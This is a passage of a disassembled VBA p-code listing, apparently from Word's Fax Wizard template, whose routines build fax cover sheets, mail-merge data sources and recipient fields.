' Line #663:
' Line #664:
' 	ArgsCall InitForm 0x0000 
' Line #665:
' 	ArgsCall InitWizardStrings 0x0000 
' Line #666:
' Line #667:
' 	LitVarSpecial (False)
' 	St fNoCovSht 
' Line #668:
' 	LitVarSpecial (False)
' 	St fStylesCopied 
' Line #669:
' 	EndSub 
' Line #670:
' Line #671:
' 	FuncDefn (Public Sub SetMainDoc(fDummy As Boolean))
' Line #672:
' 	Dim 
' 	VarDefn cDocs (As Integer)
' Line #673:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #674:
' Line #675:
' 	OnError FatalError 
' Line #676:
' Line #677:
' 	LitVarSpecial (False)
' 	St fDocIsFormLtr 
' Line #678:
' 	LitVarSpecial (False)
' 	St fDocPresent 
' Line #679:
' 	LitVarSpecial (False)
' 	St fDocChanged 
' Line #680:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St cDocs 
' Line #681:
' Line #682:
' 	Ld cDocs 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #683:
' 	QuoteRem 0x0004 0x0041 "we don't want to add the doc. that was just created thro' FileNew"
' Line #684:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld cDocs 
' 	For 
' Line #685:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld formWizard 
' 	MemLd cboDocList 
' 	ArgsMemCall AddItem 0x0001 
' Line #686:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #687:
' Line #688:
' 	LitDI2 0x0000 
' 	Ld formWizard 
' 	MemLd cboDocList 
' 	MemSt ListIndex 
' Line #689:
' 	LitVarSpecial (True)
' 	St fDocPresent 
' Line #690:
' 	ElseBlock 
' Line #691:
' 	QuoteRem 0x0008 0x0029 "just one doc. i.e the freshly created one"
' Line #692:
' 	SetStmt 
' 	LitNothing 
' 	Set objMainDoc 
' Line #693:
' 	EndIfBlock 
' Line #694:
' 	ExitSub 
' Line #695:
' Line #696:
' 	Label FatalError 
' Line #697:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #698:
' Line #699:
' 	EndSub 
' Line #700:
' Line #701:
' 	QuoteRem 0x0000 0x0032 "checks the kind of document and sets fDocIsFormLtr"
' Line #702:
' 	FuncDefn (Public Sub CheckDocKind(objDoc As ))
' Line #703:
' 	Dim 
' 	VarDefn objMM (As MailMerge)
' Line #704:
' 	Dim 
' 	VarDefn strQueryString (As String)
' Line #705:
' 	OnError LReturn 
' Line #706:
' 	LitVarSpecial (False)
' 	St fDocIsFormLtr 
' Line #707:
' 	SetStmt 
' 	Ld objMainDoc 
' 	MemLd MailMerge 
' 	Set objMM 
' Line #708:
' 	SetStmt 
' 	Ld objMM 
' 	MemLd DataSource 
' 	Set objDataSrc 
' Line #709:
' 	Ld objDataSrc 
' 	MemLd TypeOf 
' 	Ld wdNoMergeInfo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo LReturn 
' 	EndIf 
' Line #710:
' 	Ld objDataSrc 
' 	MemLd QueryString 
' 	St strQueryString 
' Line #711:
' 	Ld strQueryString 
' 	LitDI2 0x00FF 
' 	ArgsLd LBound$ 0x0002 
' 	St strFormLetterSQL 
' Line #712:
' 	Ld strQueryString 
' 	LitDI2 0x0100 
' 	ArgsLd Mid$$ 0x0002 
' 	St strFormLetterSQL1 
' Line #713:
' 	Ld objDataSrc 
' 	MemLd ConnectString 
' 	St strConnectString 
' Line #714:
' 	LitVarSpecial (True)
' 	St fDocIsFormLtr 
' Line #715:
' Line #716:
' 	ExitSub 
' Line #717:
' 	Label LReturn 
' Line #718:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #719:
' 	LitVarSpecial (False)
' 	St fDocIsFormLtr 
' Line #720:
' 	EndSub 
' Line #721:
' Line #722:
' 	FuncDefn (Public Sub CreateCoverSheet(fDummy As Boolean))
' Line #723:
' 	Dim 
' 	VarDefn strDocName (As String)
' Line #724:
' 	Dim 
' 	VarDefn objFps (As PageSetup)
' Line #725:
' Line #726:
' 	OnError FatalError 
' Line #727:
' 	Ld strCREATING_DOC 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #728:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #729:
' Line #730:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #731:
' Line #732:
' 	Ld fChangeToA4 
' 	IfBlock 
' Line #733:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	Set objFps 
' Line #734:
' 	Ld sA4_LEFT_MARGIN 
' 	Ld objFps 
' 	MemSt LeftMargin 
' Line #735:
' 	Ld sA4_RIGHT_MARGIN 
' 	Ld objFps 
' 	MemSt RightMargin 
' Line #736:
' 	Ld fChangeToLetter 
' 	ElseIfBlock 
' Line #737:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	Set objFps 
' Line #738:
' 	Ld sLETTER_MARGIN 
' 	Ld objFps 
' 	MemSt LeftMargin 
' Line #739:
' 	Ld sLETTER_MARGIN 
' 	Ld objFps 
' 	MemSt RightMargin 
' Line #740:
' 	EndIfBlock 
' Line #741:
' Line #742:
' 	LineCont 0x0004 14 00 08 00
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Or 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CreateDataSource 0x0000 
' 	EndIf 
' Line #743:
' Line #744:
' 	Ld strCREATING_DOC 
' 	St StatusBar 
' Line #745:
' 	Ld iFaxStyle 
' 	SelectCase 
' Line #746:
' 	Ld iSTY_PROFESSIONAL 
' 	Case 
' 	CaseDone 
' Line #747:
' 	ArgsCall CreateProfContCoverSheet 0x0000 
' Line #748:
' 	Ld iSTY_CONTEMPORARY 
' 	Case 
' 	CaseDone 
' Line #749:
' 	ArgsCall CreateProfContCoverSheet 0x0000 
' Line #750:
' 	Ld iSTY_ELEGANT 
' 	Case 
' 	CaseDone 
' Line #751:
' 	ArgsCall CreateElegCoverSheet 0x0000 
' Line #752:
' 	EndSelect 
' Line #753:
' Line #754:
' 	Ld fDocPresent 
' 	Paren 
' 	Ld formWizard 
' 	MemLd optCovSht 
' 	MemLd Value 
' 	Paren 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #755:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld objMainDoc 
' 	MemLd New 
' 	Concat 
' 	Ld strWINDOW_CAPTION 
' 	Concat 
' 	St strDocName 
' Line #756:
' 	ElseBlock 
' Line #757:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	Ld strCOVER_SHEET_CAPTION 
' 	Concat 
' 	St strDocName 
' Line #758:
' 	EndIfBlock 
' Line #759:
' Line #760:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #761:
' 	Ld strDocName 
' 	MemStWith Caption 
' Line #762:
' Line #763:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt TableGridlines 
' Line #764:
' 	EndWith 
' Line #765:
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #766:
' 	Ld wdStory 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #767:
' Line #768:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	With 
' Line #769:
' 	LitVarSpecial (True)
' 	MemStWith SpellingChecked 
' Line #770:
' 	LitVarSpecial (True)
' 	MemStWith GrammarChecked 
' Line #771:
' 	EndWith 
' Line #772:
' Line #773:
' 	ExitSub 
' Line #774:
' Line #775:
' 	Label FatalError 
' Line #776:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #777:
' 	EndSub 
' Line #778:
' Line #779:
' 	QuoteRem 0x0000 0x0040 "creates a data source for the cover sheet in the temp. directory"
' Line #780:
' 	FuncDefn (Private Sub CreateDataSource())
' Line #781:
' 	Dim 
' 	VarDefn objRng (As Range)
' Line #782:
' 	Dim 
' 	VarDefn strPath (As String)
' Line #783:
' 	Dim 
' 	VarDefn objDataSrcDoc (As Document)
' 	VarDefn objMM (As MailMerge)
' Line #784:
' 	Dim 
' 	VarDefn strDataSrcName (As String)
' Line #785:
' 	OnError FatalError 
' Line #786:
' Line #787:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	Set objMM 
' Line #788:
' 	Ld wdFormLetters 
' 	Ld objMM 
' 	MemSt MainDocumentType 
' Line #789:
' Line #790:
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	IfBlock 
' Line #791:
' 	Ld objDataSrc 
' 	MemLd New 
' 	Ld strConnectString 
' 	ParamNamed Connection 
' 	Ld objMM 
' 	ArgsMemCall OpenDataSource 0x0002 
' Line #792:
' 	Ld strFormLetterSQL 
' 	Ld strFormLetterSQL1 
' 	Concat 
' 	Ld objMM 
' 	MemLd DataSource 
' 	MemSt QueryString 
' Line #793:
' 	ExitSub 
' Line #794:
' 	EndIfBlock 
' Line #795:
' Line #796:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Add 
' 	Set objDataSrcDoc 
' Line #797:
' Line #798:
' 	SetStmt 
' 	Ld objDataSrcDoc 
' 	MemLd Content 
' 	Set objRng 
' Line #799:
' Line #800:
' 	Ld objRng 
' 	ArgsCall CreateTableFromFaxInfo 0x0001 
' Line #801:
' Line #802:
' 	Ld wdTempFilePath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St strPath 
' Line #803:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld strPath 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	Ld strPathSeparator 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld strPath 
' 	Ld strPathSeparator 
' 	Concat 
' 	St strPath 
' 	EndIf 
' Line #804:
' Line #805:
' 	Ld strPath 
' 	LitStr 0x0009 "~$CovSht@"
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0008 "dd-mm-yy"
' 	ArgsLd Format$$ 0x0002 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0008 "hh-mm-ss"
' 	ArgsLd Format$$ 0x0002 
' 	Concat 
' 	LitStr 0x0004 ".tmp"
' 	Concat 
' 	St strDataSrcName 
' Line #806:
' 	Ld strDataSrcName 
' 	Ld wdFormatDocument 
' 	Ld objDataSrcDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #807:
' 	Ld wdDoNotSaveChanges 
' 	Ld objDataSrcDoc 
' 	ArgsMemCall Close 0x0001 
' Line #808:
' Line #809:
' 	QuoteRem 0x0004 0x003B "attach the data source doc. to activedocument (cover sheet)"
' Line #810:
' 	Ld strDataSrcName 
' 	Ld objMM 
' 	ArgsMemCall OpenDataSource 0x0001 
' Line #811:
' Line #812:
' 	ExitSub 
' Line #813:
' 	Label FatalError 
' Line #814:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #815:
' 	EndSub 
' Line #816:
' Line #817:
' Line #818:
' 	QuoteRem 0x0000 0x0042 "creates a table in the data source document with names and numbers"
' Line #819:
' 	QuoteRem 0x0000 0x004C "the format of the table is just like how one would create a data source doc."
' Line #820:
' 	QuoteRem 0x0000 0x000C "through Word"
' Line #821:
' 	FuncDefn (Private Sub CreateTableFromFaxInfo(objRange As ))
' Line #822:
' 	Dim 
' 	VarDefn strText (As String)
' Line #823:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #824:
' Line #825:
' 	OnError FatalError 
' Line #826:
' Line #827:
' 	Ld strFLD_FAX_NAME 
' 	Ld vbCr 
' 	Concat 
' 	Ld strFLD_FAX_NUMBER 
' 	Concat 
' 	St strText 
' Line #828:
' Line #829:
' 	QuoteRem 0x0004 0x0031 "collect the names and numbers entered by the user"
' Line #830:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iNumRcpnts 
' 	For 
' Line #831:
' 	Ld strText 
' 	Ld vbCr 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrRcpntFaxNames 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrRcpntFaxNums 0x0001 
' 	Concat 
' 	St strText 
' Line #832:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #833:
' Line #834:
' 	Ld strText 
' 	Ld objRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #835:
' 	QuoteRem 0x0004 0x0030 "Add a table with 2 columns and iNumRcpnts+1 rows"
' Line #836:
' 	Ld objRange 
' 	ArgsMemCall Set 0x0000 
' Line #837:
' 	Ld vbCr 
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	Ld Selection 
' 	ArgsMemCall ConvertToTable 0x0003 
' Line #838:
' Line #839:
' 	ExitSub 
' Line #840:
' 	Label FatalError 
' Line #841:
' 	Ld wdDoNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' 	QuoteRem 0x002C 0x001A "close the data source doc."
' Line #842:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #843:
' 	EndSub 
' Line #844:
' Line #845:
' 	FuncDefn (Public Function FCopyStyles(iStyle As Integer, id_FFFE As Boolean) As Boolean)
' Line #846:
' 	Dim 
' 	VarDefn strStyleName (As String)
' Line #847:
' 	Dim 
' 	VarDefn strLongName (As String)
' Line #848:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #849:
' Line #850:
' 	OnError TemplateNotFound 
' Line #851:
' 	Label LFindTemplate 
' Line #852:
' 	QuoteRem 0x0004 0x0039 " Attempt to locate longname, then shortname template file"
' Line #853:
' 	Ld iLONG_NAME 
' 	St i 
' Line #854:
' 	Ld strTemplatePath 
' 	Ld iStyle 
' 	Ld iLONG_NAME 
' 	ArgsLd rgstrTemplateFileNames 0x0002 
' 	Concat 
' 	St strStyleName 
' Line #855:
' 	Ld strStyleName 
' 	St strLongName 
' Line #856:
' 	Ld strStyleName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo LApplyStyles 
' 	EndIf 
' Line #857:
' 	Label LTryShortName 
' Line #858:
' 	Ld iSHORT_NAME 
' 	St i 
' Line #859:
' 	Ld strTemplatePath 
' 	Ld iStyle 
' 	Ld iSHORT_NAME 
' 	ArgsLd rgstrTemplateFileNames 0x0002 
' 	Concat 
' 	St strStyleName 
' Line #860:
' Line #861:
' 	Label LApplyStyles 
' Line #862:
' 	Ld strAPPLYING 
' 	St StatusBar 
' Line #863:
' Line #864:
' 	QuoteRem 0x0004 0x000B " Get styles"
' Line #865:
' 	Ld strStyleName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall CopyStylesFromTemplate 0x0001 
' Line #866:
' Line #867:
' 	QuoteRem 0x0004 0x0009 " No Error"
' Line #868:
' 	LitVarSpecial (True)
' 	St fStylesCopied 
' Line #869:
' 	LitStr 0x0000 ""
' 	St StatusBar 
' Line #870:
' 	LitVarSpecial (True)
' 	St FCopyStyles 
' Line #871:
' 	ExitFunc 
' Line #872:
' Line #873:
' 	Label TemplateNotFound 
' Line #874:
' 	Ld i 
' 	Ld iLONG_NAME 
' 	Eq 
' 	IfBlock 
' Line #875:
' 	Ld iSHORT_NAME 
' 	St i 
' Line #876:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #877:
' 	GoTo LTryShortName 
' Line #878:
' 	EndIfBlock 
' Line #879:
' 	Ld strERR_STYLE_NOT_FOUND 
' 	Ld strLongName 
' 	Concat 
' 	Ld strERR_STYLE_NOT_FOUND2 
' 	Concat 
' 	ArgsCall DisplayErrorMsg 0x0001 
' Line #880:
' 	LitVarSpecial (False)
' 	St fStylesCopied 
' Line #881:
' 	LitStr 0x0000 ""
' 	St StatusBar 
' Line #882:
' 	LitVarSpecial (False)
' 	St FCopyStyles 
' Line #883:
' 	EndFunc 
' Line #884:
' Line #885:
' 	QuoteRem 0x0000 0x0033 "creates professional/Contemporary style cover sheet"
' Line #886:
' 	FuncDefn (Private Sub CreateProfContCoverSheet())
' Line #887:
' 	Dim 
' 	VarDefn objRngBuffer1 (As Range)
' Line #888:
' 	Dim 
' 	VarDefn objRngBuffer2 (As Range)
' Line #889:
' 	Dim 
' 	VarDefn strCmpnyName (As String)
' 	VarDefn strName (As String)
' Line #890:
' 	Dim 
' 	VarDefn strMFFirstName (As String)
' 	VarDefn strMFLastName (As String)
' 	VarDefn strMFFaxNum (As String)
' Line #891:
' 	Dim 
' 	VarDefn objRngTextTable (As Range)
' Line #892:
' 	Dim 
' 	VarDefn objTable (As Table)
' Line #893:
' Line #894:
' 	OnError FatalError 
' Line #895:
' Line #896:
' 	Ld iFaxStyle 
' 	Ld iSTY_CONTEMPORARY 
' 	Eq 
' 	IfBlock 
' Line #897:
' 	ArgsCall InsertContAutoText 0x0000 
' Line #898:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #899:
' 	EndIfBlock 
' Line #900:
' Line #901:
' 	ArgsCall InsertReturnAddress 0x0000 
' Line #902:
' 	Ld strMFFirstName 
' 	Ld strMFLastName 
' 	Ld strMFFaxNum 
' 	ArgsCall GetMergeFieldNames 0x0003 
' Line #903:
' Line #904:
' 	QuoteRem 0x0004 0x0013 "Insert company name"
' Line #905:
' 	Ld formWizard 
' 	MemLd txtCompany 
' 	MemLd Then 
' 	St strCmpnyName 
' Line #906:
' 	Ld iFaxStyle 
' 	Ld iSTY_PROFESSIONAL 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #907:
' 	Ld strCmpnyName 
' 	FnLen 
' 	Paren 
' 	IfBlock 
' Line #908:
' 	Ld strSTY_COMPANY_NAME 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #909:
' 	Ld strCmpnyName 
' 	Ld vbCr 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #910:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #911:
' 	EndIfBlock 
' Line #912:
' 	QuoteRem 0x0008 0x000C "Insert title"
' Line #913:
' 	Ld strSTY_DOC_LABEL 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #914:
' 	Ld iFaxStyle 
' 	ArgsLd rgstrFaxTitle 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #915:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #916:
' 	EndIfBlock 
' Line #917:
' Line #918:
' Line #919:
' Line #920:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngTextTable 
' Line #921:
' Line #922:
' 	QuoteRem 0x0000 0x003F "the topics To: and From: have a character style which has to be"
' Line #923:
' 	QuoteRem 0x0000 0x003E "applied after the data has been written (since the data have a"
' Line #924:
' 	QuoteRem 0x0000 0x0028 "different style). so, use a range buffer"
' Line #925:
' Line #926:
' 	QuoteRem 0x0004 0x003E "1st line text has style "Message Header First". The subsequent"
' Line #927:
' 	QuoteRem 0x0004 0x001B "lines have "Message Header""
' Line #928:
' Line #929:
' 	QuoteRem 0x0004 0x000A "Insert To:"
' Line #930:
' 	Ld strSTY_MSG_HDR_FIRST 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #931:
' 	Ld strTO 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #932:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #933:
' Line #934:
' 	QuoteRem 0x0004 0x0015 "insert recipient name"
' Line #935:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #936:
' 	Ld vbTab 
' 	LitDI2 0x0000 
' 	ArgsLd rgstrRcpntFaxNames 0x0001 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #937:
' 	ElseBlock 
' Line #938:
' 	QuoteRem 0x0008 0x0018 "insert appropriate field"
' Line #939:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #940:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #941:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #942:
' 	Ld objActiveRange 
' 	Ld wdFieldMergeField 
' 	Ld strMFFirstName 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' Line #943:
' 	Ld strMFLastName 
' 	FnLen 
' 	IfBlock 
' Line #944:
' 	Ld strSPACE 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #945:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #946:
' 	Ld objActiveRange 
' 	Ld wdFieldMergeField 
' 	Ld strMFLastName 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' Line #947:
' 	EndIfBlock 
' Line #948:
' 	ElseBlock 
' Line #949:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_NAME 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #950:
' 	EndIfBlock 
' Line #951:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #952:
' 	EndIfBlock 
' Line #953:
' Line #954:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #955:
' Line #956:
' 	QuoteRem 0x0004 0x000C "Insert From:"
' Line #957:
' 	Ld strFROM 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #958:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer2 
' Line #959:
' Line #960:
' 	QuoteRem 0x0004 0x0014 "insert sender's name"
' Line #961:
' 	Ld formWizard 
' 	MemLd txtSenderName 
' 	MemLd Then 
' 	St strName 
' Line #962:
' 	Ld strName 
' 	FnLen 
' 	IfBlock 
' Line #963:
' 	Ld vbTab 
' 	Ld strName 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #964:
' 	ElseBlock 
' Line #965:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #966:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #967:
' 	QuoteRem 0x0008 0x0019 "insert macrobutton field."
' Line #968:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_NAME 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #969:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #970:
' 	EndIfBlock 
' Line #971:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #972:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #973:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #974:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer2 
' 	MemSt Style 
' Line #975:
' Line #976:
' 	QuoteRem 0x0004 0x0026 "next 3 lines in "Message Header" style"
' Line #977:
' 	QuoteRem 0x0004 0x0011 "Insert Fax Number"
' Line #978:
' 	Ld wdStyleMessageHeader 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #979:
' Line #980:
' 	Ld strFAX 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #981:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #982:
' Line #983:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #984:
' 	Ld vbTab 
' 	LitDI2 0x0000 
' 	ArgsLd rgstrRcpntFaxNums 0x0001 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #985:
' 	ElseBlock 
' Line #986:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #987:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #988:
' 	QuoteRem 0x0008 0x001C "insert the appropriate field"
' Line #989:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #990:
' 	Ld objActiveRange 
' 	Ld wdFieldMergeField 
' 	Ld strMFFaxNum 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' Line #991:
' 	ElseBlock 
' Line #992:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_FAX_NUMBER 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #993:
' 	EndIfBlock 
' Line #994:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #995:
' 	EndIfBlock 
' Line #996:
' Line #997:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #998:
' Line #999:
' 	QuoteRem 0x0004 0x000B "Insert Date"
' Line #1000:
' 	Ld strDATE 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1001:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer2 
' Line #1002:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1003:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1004:
' 	QuoteRem 0x0004 0x0010 "insert datefield"
' Line #1005:
' 	Ld objActiveRange 
' 	Ld wdFieldTime 
' 	LitStr 0x0003 "\@ "
' 	Ld strQUOTE 
' 	Concat 
' 	Ld strDATE_FORMAT 
' 	Concat 
' 	Ld strQUOTE 
' 	Concat 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' Line #1006:
' Line #1007:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #1008:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1009:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #1010:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1011:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer2 
' 	MemSt Style 
' Line #1012:
' Line #1013:
' Line #1014:
' 	QuoteRem 0x0004 0x0009 "Next line"
' Line #1015:
' 	QuoteRem 0x0004 0x000C "Insert Phone"
' Line #1016:
' 	Ld strPHONE 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1017:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #1018:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1019:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1020:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_PHONE_NUMBER 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1021:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1022:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1023:
' Line #1024:
' 	QuoteRem 0x0004 0x000D "Insert Pages:"
' Line #1025:
' 	Ld strPAGES 
